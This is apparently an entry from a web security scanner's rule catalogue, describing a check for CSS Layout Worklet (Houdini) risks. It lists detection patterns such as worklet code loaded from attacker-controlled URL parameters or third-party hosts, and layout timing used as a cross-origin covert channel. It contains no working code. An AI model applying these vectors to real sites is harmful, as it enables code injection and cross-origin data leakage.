**References:** [↗](https://drafts.css-houdini.org/css-animationworklet/) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 405. CSS Layout Worklet (Houdini) Security
**Module:** `layout_worklet_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-94**

layoutWorklet.addModule() URL from URL parameter: attacker-controlled CSS layout worklet code loaded and executed Layout worklet loaded from external third-party URL: untrusted code executes in CSS layout context with document access Layout timing values transmitted: registerLayout() computation time used as cross-origin covert timing channel display:layout() worklet name from URL parameter: attacker selects which layout algorithm applies to page elements

**References:** [↗](https://drafts.css-houdini.org/css-layout-api/) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---
